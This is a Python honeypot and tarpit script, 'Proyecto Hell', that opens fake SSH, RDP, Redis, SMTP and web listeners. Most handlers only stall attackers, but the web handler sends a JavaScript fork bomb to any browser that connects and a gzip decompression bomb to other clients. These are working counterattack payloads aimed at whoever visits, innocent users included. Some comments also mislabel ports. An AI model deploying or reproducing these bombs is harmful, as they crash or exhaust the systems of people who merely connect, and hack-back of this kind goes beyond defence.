import socket
import threading
import time
import random
import os
from ai_module import GeminiDefender
from threat_intel import VirusTotalReporter

# CONFIGURACIÓN EXPANDIDA DEL PROYECTO HELL
HOST = '0.0.0.0'
# Mapeo: 8080(Web), 2525(SMTP), 3306(MySQL), 2222(SSH), 3389(RDP), 6379(Redis)
PORTS = [8080, 2525, 3306, 2222, 3389, 6379]
GZIP_BOMB_PATH = "payloads/bomb.gz"
LOG_FILE = "logs/hell_activity.log"

USE_AI = os.getenv("USE_AI", "false").lower() == "true"
GEMINI_KEY = os.getenv("GEMINI_API_KEY", "")
VT_KEY = os.getenv("VT_API_KEY", "")

class HellServer:
    def __init__(self):
        self.defender = GeminiDefender(GEMINI_KEY) if USE_AI else None
        self.reporter = VirusTotalReporter(VT_KEY)
        print(f"[💀] PROYECTO HELL: MODO LETHAL ACTIVADO")

    def log_event(self, message):
        timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
        with open(LOG_FILE, "a") as f:
            f.write(f"[{timestamp}] {message}\n")
        print(message)

    def ssh_tarpit(self, client_socket, addr):
        """Tarpit para SSH (Puerto 22) - Ralentización de Banner"""
        try:
            self.log_event(f"[🔑] SSH Bruteforce detectado desde {addr[0]}. Iniciando Tarpit.")
            client_socket.send(b"SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5\r\n")
            while True:
                time.sleep(10)
                client_socket.send(b"Protocol mismatch. Retrying authentication...\r\n")
        except: pass

    def rdp_tarpit(self, client_socket, addr):
        """Tarpit para RDP (Puerto 3389) - Congelamiento de Handshake"""
        try:
            self.log_event(f"[🖥️] Intento de RDP desde {addr[0]}. Congelando conexión.")
            # Simular paquete de inicio de RDP
            client_socket.send(b"\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00")
            while True:
                time.sleep(60) # Mantener vivo pero sin responder
                client_socket.send(b"\x00")
        except: pass

    def redis_tarpit(self, client_socket, addr):
        """Tarpit para Redis (Puerto 6379) - Infinite Data Dump"""
        try:
            self.log_event(f"[📊] Intento de Redis desde {addr[0]}. Enviando basura infinita.")
            while True:
                junk = "+" + "".join(random.choices("ABCDEF0123456789", k=1024)) + "\r\n"
                client_socket.send(junk.encode())
                time.sleep(0.5)
        except: pass

    def handle_client(self, client_socket, addr, local_port):
        if local_port == 2222: self.ssh_tarpit(client_socket, addr)
        elif local_port == 3389: self.rdp_tarpit(client_socket, addr)
        elif local_port == 6379: self.redis_tarpit(client_socket, addr)
        elif local_port == 2525: # SMTP del paso anterior
            try:
                client_socket.send(b"220 hell.system ESMTP\r\n")
                while True:
                    time.sleep(20); client_socket.send(b"250-OK\r\n")
            except: pass
        else:
            # Lógica Web (Puerto 8080)
            try:
                request = client_socket.recv(2048).decode('utf-8', errors='ignore')
                self.log_event(f"[*] Conexión Web desde {addr[0]}")
                
                # Contraataque 1: JS Bomb si es navegador
                if "User-Agent" in request and ("Mozilla" in request or "Chrome" in request):
                    self.log_event(f"[🧨] Enviando JS BOMB a {addr[0]}")
                    js_bomb = "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<script>while(true){new Worker(URL.createObjectURL(new Blob(['while(true){}'])));}</script>"
                    client_socket.send(js_bomb.encode())
                
                # Contraataque 2: Honey-Tokens
                elif "aws" in request.lower() or "key" in request.lower():
                    self.log_event(f"[🕵️] Entregando Honey-Tokens a {addr[0]}")
                    keys = "HTTP/1.1 200 OK\r\n\r\nAWS_KEY=AKIAJ7EXAMPLE\r\nAWS_SECRET=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
                    client_socket.send(keys.encode())
                    self.reporter.report_ip(addr[0])

                # Fallback a Gzip Bomb
                else:
                    header = "HTTP/1.1 200 OK\r\nContent-Encoding: gzip\r\n\r\n"
                    client_socket.send(header.encode())
                    if os.path.exists(GZIP_BOMB_PATH):
                        with open(GZIP_BOMB_PATH, "rb") as f: client_socket.send(f.read())
            except: pass
        
        client_socket.close()

    def start_listener(self, port):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((HOST, port))
        server.listen(100)
        self.log_event(f"[✔] Puerto {port} en guardia.")
        while True:
            client, addr = server.accept()
            threading.Thread(target=self.handle_client, args=(client, addr, port)).start()

    def start(self):
        for port in PORTS:
            threading.Thread(target=self.start_listener, args=(port,)).start()

if __name__ == "__main__":
    HellServer().start()
